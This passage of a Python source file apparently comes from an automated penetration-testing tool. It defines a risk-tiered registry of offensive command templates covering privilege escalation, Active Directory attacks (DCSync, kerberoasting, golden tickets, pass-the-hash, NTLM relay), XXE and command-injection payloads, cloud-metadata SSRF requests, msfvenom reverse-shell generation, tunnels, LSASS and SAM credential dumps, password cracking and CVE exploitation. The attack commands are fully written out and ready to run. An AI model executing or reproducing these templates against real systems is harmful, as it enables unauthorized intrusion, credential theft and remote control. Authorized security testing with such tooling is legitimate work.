            "privesc.linux.suid-find",
            RiskLevel.L0,
            _find,
            (_find, "/", "-perm", "-4000", "-type", "f", "-ls", "2>/dev/null"),
        )
    )

    # -- sudo privileges check (L0, local) --
    _sudo = tool_path("sudo") or "/usr/bin/sudo"
    defs.append(
        _local(
            "privesc.linux.sudo-check",
            RiskLevel.L0,
            _sudo,
            (_sudo, "-l"),
        )
    )

    # -- capabilities enumeration (L0, local) --
    _getcap = tool_path("getcap") or "/usr/sbin/getcap"
    defs.append(
        _local(
            "privesc.linux.capabilities",
            RiskLevel.L0,
            _getcap,
            (_getcap, "-r", "/", "2>/dev/null"),
        )
    )

    # -- writable paths (L0, local) --
    defs.append(
        _local(
            "privesc.linux.writable",
            RiskLevel.L0,
            _find,
            (_find, "/", "-writable", "-type", "f", "-ls", "2>/dev/null"),
        )
    )

    # -- cron jobs (L0, local) --
    defs.append(
        _local(
            "privesc.linux.cron",
            RiskLevel.L0,
            _find,
            (_find, "/etc/cron*", "-type", "f", "-ls", "2>/dev/null"),
        )
    )

    # -- GTFOBins sudo shell escape (L3, local) --
    defs.append(
        _local(
            "privesc.linux.gtfobins-sudo",
            RiskLevel.L3,
            _sudo,
            (_sudo, "{binary}", "-c", "!/bin/sh"),
            shell_execution=True,
        )
    )

    # =====================================================================
    # PRIVILEGE ESCALATION — WINDOWS
    # =====================================================================

    # -- AlwaysInstallElevated (L1) --
    defs.append(
        _net(
            "privesc.windows.always-install-elevated",
            RiskLevel.L1,
            "reg",
            ("reg", "query", "HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer", "/v", "AlwaysInstallElevated"),
            low_impact_allowlisted=True,
        )
    )

    # -- Potato exploit (SeImpersonate) (L3) --
    defs.append(
        _net(
            "privesc.windows.potato",
            RiskLevel.L3,
            "juicy-potato",
            ("juicy-potato", "-l", "1337", "-p", "{target}", "-t", "*"),
        )
    )

    # =====================================================================
    # ACTIVE DIRECTORY — ENUMERATION
    # =====================================================================

    kbrute = t("kerbrute")
    if kbrute is not None:
        defs.append(
            _net(
                "ad.enum.kerbrute-userenum",
                RiskLevel.L1,
                kbrute,
                (kbrute, "userenum", "--dc", "{dc_ip}", "-d", "{domain}", "{wordlist}"),
                low_impact_allowlisted=True,
            )
        )
        defs.append(
            _net(
                "ad.enum.kerbrute-bruteuser",
                RiskLevel.L2,
                kbrute,
                (kbrute, "bruteuser", "--dc", "{dc_ip}", "-d", "{domain}", "{wordlist}"),
                authenticated=True,
            )
        )
        defs.append(
            _net(
                "ad.enum.kerbrute-passwordspray",
                RiskLevel.L2,
                kbrute,
                (kbrute, "passwordspray", "--dc", "{dc_ip}", "-d", "{domain}", "{userlist}", "{password}"),
                authenticated=True,
            )
        )

    e4l = t("enum4linux")
    if e4l is not None:
        defs.append(
            _net(
                "ad.enum.enum4linux",
                RiskLevel.L1,
                e4l,
                (e4l, "-a", "{target}"),
                low_impact_allowlisted=True,
            )
        )

    rpc = t("rpcclient")
    if rpc is not None:
        defs.append(
            _net(
                "ad.enum.rpcclient-users",
                RiskLevel.L1,
                rpc,
                (rpc, "-N", "{target}", "-c", "enumdomusers"),
                low_impact_allowlisted=True,
            )
        )
        defs.append(
            _net(
                "ad.enum.rpcclient-groups",
                RiskLevel.L1,
                rpc,
                (rpc, "-N", "{target}", "-c", "enumdomgroups"),
                low_impact_allowlisted=True,
            )
        )

    smb = t("smbclient")
    if smb is not None:
        defs.append(
            _net(
                "ad.enum.smb-shares",
                RiskLevel.L1,
                smb,
                (smb, "-L", "{target}", "-N"),
                low_impact_allowlisted=True,
            )
        )

    bh = t("bloodhound-python")
    if bh is not None:
        defs.append(
            _net(
                "ad.collect.bloodhound",
                RiskLevel.L2,
                bh,
                (bh, "-d", "{domain}", "-u", "{user}", "-p", "{password}", "-dc", "{dc_ip}", "-c", "All", "--zip"),
                authenticated=True,
            )
        )

    # =====================================================================
    # ACTIVE DIRECTORY — ATTACKS
    # =====================================================================

    defs.append(
        _net(
            "ad.attack.asrep-roast",
            RiskLevel.L2,
            "getnpusers.py",
            ("getnpusers.py", "{target}", "-format", "hashcat"),
            touches_third_party=True,
        )
    )

    defs.append(
        _net(
            "ad.attack.kerberoast",
            RiskLevel.L2,
            "getuserspns.py",
            ("getuserspns.py", "{target}", "-request", "-outputfile", "{output}"),
            authenticated=True,
            touches_third_party=True,
        )
    )

    defs.append(
        _net(
            "ad.attack.dcsync",
            RiskLevel.L3,
            "secretsdump.py",
            ("secretsdump.py", "{target}", "-just-dc"),
            authenticated=True,
            touches_third_party=True,
        )
    )

    defs.append(
        _net(
            "ad.attack.pass-the-hash",
            RiskLevel.L3,
            "nxc",
            ("nxc", "smb", "{target}", "-H", "{hash}"),
            authenticated=True,
        )
    )

    defs.append(
        _net(
            "ad.attack.silver-ticket",
            RiskLevel.L3,
            "ticketer.py",
            ("ticketer.py", "-nthash", "{hash}", "-domain-sid", "{sid}", "-domain", "{domain}", "-spn", "{spn}"),
            touches_third_party=True,
        )
    )

    defs.append(
        _net(
            "ad.attack.golden-ticket",
            RiskLevel.L3,
            "ticketer.py",
            ("ticketer.py", "-nthash", "{hash}", "-domain-sid", "{sid}", "-domain", "{domain}"),
            touches_third_party=True,
        )
    )

    defs.append(
        _net(
            "ad.attack.gpp-password",
            RiskLevel.L2,
            "gpp-decrypt",
            ("gpp-decrypt", "{cpassword}"),
            low_impact_allowlisted=True,
        )
    )

    defs.append(
        _net(
            "ad.attack.smb-relay",
            RiskLevel.L3,
            "ntlmrelayx.py",
            ("ntlmrelayx.py", "-tf", "{target}", "-smb2support"),
            touches_third_party=True,
        )
    )

    defs.append(
        _net(
            "ad.attack.adcs-enum",
            RiskLevel.L2,
            "certipy",
            ("certipy", "find", "-u", "{user}", "-p", "{password}", "-dc-ip", "{dc_ip}", "-vulnerable"),
            authenticated=True,
        )
    )

    defs.append(
        _net(
            "ad.attack.adcs-exploit",
            RiskLevel.L3,
            "certipy",
            ("certipy", "req", "-u", "{user}", "-p", "{password}", "-dc-ip", "{dc_ip}", "-ca", "{ca_name}", "-template", "{template}"),
            authenticated=True,
            touches_third_party=True,
        )
    )

    defs.append(
        _net(
            "ad.attack.petitpotam",
            RiskLevel.L2,
            "petitpotam.py",
            ("petitpotam.py", "-d", "{domain}", "-u", "{user}", "-p", "{password}", "{listener_ip}", "{target}"),
            authenticated=True,
            touches_third_party=True,
        )
    )

    defs.append(
        _net(
            "ad.attack.unconstrained-delegation",
            RiskLevel.L1,
            "finddelegation.py",
            ("finddelegation.py", "{target}"),
            authenticated=True,
            low_impact_allowlisted=True,
        )
    )

    defs.append(
        _net(
            "ad.attack.rbcd",
            RiskLevel.L3,
            "rbcd.py",
            ("rbcd.py", "-delegate-from", "{controlled_account}", "-delegate-to", "{target}", "-action", "write"),
            authenticated=True,
            touches_third_party=True,
        )
    )

    # =====================================================================
    # WEB EXPLOITATION — INJECTION & SSRF
    # =====================================================================

    defs.append(
        _net(
            "web.inject.ssti-probe",
            RiskLevel.L1,
            "curl",
            ("curl", "-sS", "--max-time", "10", "-G", "{target}", "--data-urlencode", "q=49"),
            low_impact_allowlisted=True,
        )
    )

    for ssrf_id, ssrf_target, ssrf_header in (
        ("web.inject.ssrf-aws", "http://169.254.169.254/latest/meta-data/", ""),
        ("web.inject.ssrf-gcp", "http://metadata.google.internal/0.1/meta-data/", "Metadata-Flavor: Google"),
        ("web.inject.ssrf-azure", "http://169.254.169.254/metadata/instance?api-version=2021-02-01", "Metadata: true"),
    ):
        ssrf_args: tuple[str, ...]
        if ssrf_header:
            ssrf_args = ("curl", "-sS", "--max-time", "5", ssrf_target, "-H", ssrf_header)
        else:
            ssrf_args = ("curl", "-sS", "--max-time", "5", ssrf_target)
        defs.append(
            _net(
                ssrf_id,
                RiskLevel.L1,
                "curl",
                ssrf_args,
                low_impact_allowlisted=True,
            )
        )

    defs.append(
        _net(
            "web.inject.cmd-probe",
            RiskLevel.L2,
            "curl",
            ("curl", "-sS", "--max-time", "15", "-G", "{target}", "--data-urlencode", "q=;sleep 5"),
            state_changing=True,
        )
    )

    defs.append(
        _net(
            "web.inject.xxe-probe",
            RiskLevel.L1,
            "curl",
            ("curl", "-sS", "--max-time", "10", "-X", "POST", "{target}", "-H", "Content-Type: application/xml", "-d", '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>'),
            low_impact_allowlisted=True,
        )
    )

    # =====================================================================
    # POST-EXPLOITATION — SHELLS & TUNNELING
    # =====================================================================

    nc = t("nc")
    if nc is not None:
        defs.append(
            _net(
                "post.shell.nc-listener",
                RiskLevel.L3,
                nc,
                (nc, "-lvnp", "{port}"),
                touches_third_party=True,
            )
        )

    msfv = t("msfvenom")
    if msfv is not None:
        for msf_id, msf_payload, msf_fmt in (
            ("post.payload.msfvenom-linux-elf", "linux/x64/shell_reverse_tcp", "elf"),
            ("post.payload.msfvenom-windows-exe", "windows/x64/shell_reverse_tcp", "exe"),
            ("post.payload.msfvenom-php", "php/reverse_php", "raw"),
            ("post.payload.msfvenom-python", "python/shell_reverse_tcp", "raw"),
        ):
            defs.append(
                _local(
                    msf_id,
                    RiskLevel.L3,
                    msfv,
                    (msfv, "-p", msf_payload, "-f", msf_fmt, "-o", "{output}"),
                )
            )

    chisel = t("chisel")
    if chisel is not None:
        defs.append(
            _net(
                "post.tunnel.chisel-server",
                RiskLevel.L3,
                chisel,
                (chisel, "server", "-p", "{port}", "--reverse"),
            )
        )
        defs.append(
            _net(
                "post.tunnel.chisel-client",
                RiskLevel.L3,
                chisel,
                (chisel, "client", "{server}:{port}", "R:socks"),
                touches_third_party=True,
            )
        )

    ligolo = t("ligolo-ng")
    if ligolo is not None:
        defs.append(
            _net(
                "post.tunnel.ligolo-server",
                RiskLevel.L3,
                ligolo,
                (ligolo, "-selfcert"),
            )
        )

    # =====================================================================
    # PASSWORD ATTACKS — CRACKING & GENERATION
    # =====================================================================

    hid = t("hashid")
    if hid is not None:
        defs.append(
            _local(
                "pass.hashid",
                RiskLevel.L0,
                hid,
                (hid, "-m", "{target}"),
            )
        )

    nth = t("name-that-hash")
    if nth is not None:
        defs.append(
            _local(
                "pass.name-that-hash",
                RiskLevel.L0,
                nth,
                (nth, "-t", "{target}"),
            )
        )

    hashcat = t("hashcat")
    if hashcat is not None:
        for hc_id, hc_mode in (
            ("pass.crack.hashcat-ntlm", "1000"),
            ("pass.crack.hashcat-netntlmv2", "5600"),
            ("pass.crack.hashcat-asrep", "18200"),
            ("pass.crack.hashcat-kerberoast", "13100"),
            ("pass.crack.hashcat-md5", "0"),
            ("pass.crack.hashcat-sha256", "1400"),
            ("pass.crack.hashcat-wpapsk", "22000"),
        ):
            defs.append(
                _local(
                    hc_id,
                    RiskLevel.L3,
                    hashcat,
                    (hashcat, "-m", hc_mode, "-a", "0", "{target}", "{wordlist}", "--force", "--status"),
                )
            )

    john = t("john")
    if john is not None:
        defs.append(
            _local(
                "pass.crack.john",
                RiskLevel.L3,
                john,
                (john, "--wordlist", "{wordlist}", "{target}"),
            )
        )

    cewl = t("cewl")
    if cewl is not None:
        defs.append(
            _local(
                "pass.wordlist-cewl",
                RiskLevel.L0,
                cewl,
                (cewl, "-d", "2", "-m", "5", "-w", "{output}", "{target}"),
            )
        )

    # =====================================================================
    # CLOUD METADATA ATTACKS
    # =====================================================================

    for cloud_id, cloud_url, cloud_hdr in (
        ("cloud.metadata-aws", "http://169.254.169.254/latest/meta-data/", ""),
        ("cloud.metadata-gcp", "http://metadata.google.internal/computeMetadata/v1/instance/?recursive=true", "Metadata-Flavor: Google"),
        ("cloud.metadata-azure", "http://169.254.169.254/metadata/instance?api-version=2021-02-01", "Metadata: true"),
    ):
        cloud_args = ("curl", "-sS", "--max-time", "5", cloud_url)
        if cloud_hdr:
            cloud_args = cloud_args + ("-H", cloud_hdr)
        defs.append(
            _net(
                cloud_id,
                RiskLevel.L1,
                "curl",
                cloud_args,
                low_impact_allowlisted=True,
            )
        )

    # =====================================================================
    # CREDENTIAL DUMPING
    # =====================================================================

    defs.append(
        _net(
            "post.creds.lsass-dump",
            RiskLevel.L3,
            "procdump",
            ("procdump", "-accepteula", "-ma", "lsass.exe", "{output}"),
            touches_third_party=True,
        )
    )

    defs.append(
        _net(
            "post.creds.sam-dump",
            RiskLevel.L3,
            "reg",
            ("reg", "save", "HKLM\\SAM", "{output}"),
            touches_third_party=True,
        )
    )

    # =====================================================================
    # CVE EXPLOITATION — COMMON VERIFIED CVEs
    # =====================================================================

    for cve_id, cve_name in (
        ("cve.linux.dirty-pipe", "CVE-2022-0847"),
        ("cve.linux.pwnkit", "CVE-2021-4034"),
        ("cve.linux.sudo-baron", "CVE-2021-3156"),
        ("cve.windows.eternalblue", "MS17-010"),
        ("cve.windows.printnightmare", "CVE-2021-34527"),
        ("cve.windows.zerologon", "CVE-2020-1472"),
        ("cve.web.log4shell", "CVE-2021-44228"),
        ("cve.web.proxyshell", "CVE-2021-34473"),
        ("cve.web.confluence", "CVE-2022-26134"),
    ):
        defs.append(
            _net(
                cve_id,
                RiskLevel.L3,
                "cve-check",
                ("cve-check", cve_name, "{target}"),
                touches_third_party=True,
            )
        )

    # =====================================================================
    # REMOTE ACCESS
    # =====================================================================

    evil = t("evil-winrm")
    if evil is not None:
        defs.append(
            _net(
                "remote.evil-winrm",
                RiskLevel.L3,
                evil,
                (evil, "-i", "{target}", "-u", "{user}", "-p", "{password}"),
                authenticated=True,
            )
        )
        defs.append(
            _net(
                "remote.evil-winrm-hash",
                RiskLevel.L3,
                evil,
                (evil, "-i", "{target}", "-u", "{user}", "-H", "{hash}"),
                authenticated=True,
            )
        )

    rdp = t("xfreerdp")
    if rdp is not None:
        defs.append(
            _net(
                "remote.rdp",
                RiskLevel.L2,
                rdp,
                (rdp, "/v:{target}", "/u:{user}", "/p:{password}", "/cert:ignore", "+clipboard"),
                authenticated=True,
            )
        )

    return defs


# =========================================================================
# Immutable registry — built once at import time
# =========================================================================

_DEFINITIONS = _build_definitions()

# Backward-compat aliases: tests and older code reference these short action IDs.
# Only registered when the underlying tool is available.
# These keep the original argv templates from pre-arsenal-expansion.
_COMPAT_ALIASES: dict[str, tuple[str, ...]] = {
    # DNS — original simple dig-based templates
    "dns.lookup": ("dig", "+short", "{target}"),
    "dns.txt": ("dig", "+short", "{target}", "TXT"),
    "dns.mx": ("dig", "+short", "{target}", "MX"),
    "dns.ns": ("dig", "+short", "{target}", "NS"),
    # TLS — original simple openssl template
    "tls.cert": ("openssl", "s_client", "-connect", "{target}"),
    # Port scan — original nmap template
    "net.port-scan": ("nmap", "-Pn", "-T3", "--top-ports", "100", "{target}"),
    # FFUF — original dir enum template
    "web.dir-enum": ("ffuf", "-s", "-rate", "{rate}", "-u", "{target}", "-w", "{wordlist}"),
}

# Map compat IDs to the executables they need
_COMPAT_DEPENDENCIES: dict[str, str] = {
    "dns.lookup": "dig",
    "dns.txt": "dig",
    "dns.mx": "dig",
    "dns.ns": "dig",
    "tls.cert": "openssl",
    "net.port-scan": "nmap",
    "web.dir-enum": "ffuf",
}

_by_id: dict[str, object] = {d.action_id: d for d in _DEFINITIONS}
for _old_id, _tmpl in _COMPAT_ALIASES.items():
    if _old_id not in _by_id:
        _dep = _COMPAT_DEPENDENCIES.get(_old_id, "")
        _exe = tool_path(_dep) if _dep else None
        if _exe is not None:
            # Reconstruct the original simple template with the found executable
            _argv = tuple(_exe if token == _tmpl[0] else token for token in _tmpl)
            _low_impact = _old_id in ("dns.lookup", "dns.txt", "dns.mx", "dns.ns")
            # Only add wordlist-compat entries when the wordlist file actually exists
            if _old_id == "web.dir-enum" and not Path(web_content_wordlist()).is_file():
                continue
            _DEFINITIONS.append(
                _net(
                    _old_id,
                    RiskLevel.L2 if _old_id in ("net.port-scan", "web.dir-enum") else RiskLevel.L0,
                    _exe,
                    _argv,
                    **(
                        {"high_volume": True}
                        if _old_id in ("net.port-scan", "web.dir-enum")
                        else {}
                    ),
                ),
            )

REAL_ACTIONS = ActionRegistry(_DEFINITIONS)
REGISTERED_ACTION_IDS: tuple[str, ...] = tuple(d.action_id for d in _DEFINITIONS)

# Build a stable categorization map for skills listing
ACTION_CATEGORIES: dict[str, tuple[str, ...]] = {}
for d in _DEFINITIONS:
    cat = d.action_id.split(".")[0] if "." in d.action_id else "other"
    ACTION_CATEGORIES.setdefault(cat, ())


__all__ = [
    "ACTION_CATEGORIES",
    "REAL_ACTIONS",
    "REGISTERED_ACTION_IDS",
    "curl_path",
    "dig_path",
    "ffuf_path",
    "local_wordlists",
    "nmap_path",
    "openssl_path",
    "resolve_executable",
    "resolve_local_wordlist",
    "tool_path",
    "web_content_wordlist",
]
